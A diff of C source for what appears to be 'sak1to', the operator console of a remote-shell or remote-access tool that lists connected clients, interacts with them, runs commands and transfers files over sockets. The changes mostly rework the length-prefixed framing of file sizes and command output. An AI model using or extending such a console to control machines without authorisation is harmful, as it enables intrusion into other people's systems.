@@ -191,10 +191,10 @@ int send_file(char* const buf, const size_t cmd_len, int client_socket) {
 
 	// Calculate file size and serialize the file size integer.
 	int32_t f_size = (int32_t)lseek(fd, 0, SEEK_END);
-	int32_t bytes = (int32_t)htonl(f_size);
+	uint32_t bytes = htonl(f_size);
 
 	// Send the serialized file size bytes.
-	if (write(client_socket, (char*)&bytes, sizeof(int32_t)) < 1)
+	if (write(client_socket, (char*)&bytes, sizeof(uint32_t)) < 1)
 		return SOCKET_ERROR;
  
 	// Initialize i_result as true.
@@ -227,7 +227,7 @@ int recv_file(char* const buf, const size_t cmd_len, int client_socket) {
 		return SOCKET_ERROR;
  
 	// Receive serialized file size int32_t bytes.
-	if (read(client_socket, buf, sizeof(int32_t)) < 1)
+	if (read(client_socket, buf, sizeof(uint32_t)) < 1)
 		return SOCKET_ERROR;
  
 	// Deserialize file size bytes.
@@ -304,21 +304,28 @@ int send_cmd(char* const buf, const size_t cmd_len, int client_socket) {
 	if (write(client_socket, buf, cmd_len) < 1)
 		return SOCKET_ERROR;
 
-	// Initialize i_result to true/1.
-	int i_result = SUCCESS;
+	memset(buf, '\0', BUFLEN);
 
 	// Receive command output stream and write output chunks to stdout.
-	do {
-		i_result = read(client_socket, buf, BUFLEN);
-		if (buf[0] == EOS[0])
+	while (1) {
+		if (read(client_socket, buf, sizeof(uint32_t)) < 1)
+			return SOCKET_ERROR;
+
+		int32_t chunk_size = ntohl_conv(&*(buf));
+
+		if (chunk_size == 0)
 			break;
-		fwrite(buf, 1, i_result, stdout);
-	} while (i_result > 0);
+
+		if (read(client_socket, buf, chunk_size) < 1)
+			return SOCKET_ERROR;
+
+		write(STDOUT_FILENO, buf, chunk_size);
+	}
 
 	// write a single newline to stdout for cmd line output alignment.
 	fputc('\n', stdout);
 
-	return i_result;
+	return SUCCESS;
 }
 
 // Function to resize s_map array/remove and close connection.
@@ -437,14 +444,14 @@ void exec_cmd(Server_map *s_map) {
 	pclose(fpipe);
 }
 
-void sakito_console(Server_map* s_map) {
+void sakito_console(Server_map *s_map) {
 	// Saktio console loop.
 	while (1) {
 		getcwd(s_map->buf, BUFLEN);
 		printf("sak1to-console:~%s$ ", s_map->buf);
 		
 		// Set all bytes in buffer to zero.
-		memset(s_map->buf, '\0', BUFLEN+1);
+		memset(s_map->buf, '\0', BUFLEN);
 
 		// Array of command strings to parse stdin with.
 		const char commands[4][11] = { "cd ", "exit", "list", "interact " };
@@ -455,11 +462,11 @@ void sakito_console(Server_map* s_map) {
 		// Parse and execute command function.
 		size_t cmd_len = 0;
 		const console_func target_func = (const console_func)parse_cmd(s_map->buf,
-									 &cmd_len,
-									 4,
-									 commands,
-									 func_array,
-									 &exec_cmd);
+										 &cmd_len,
+										 4,
+										 commands,
+										 func_array,
+										 &exec_cmd);
 
 		target_func(s_map);
 	}
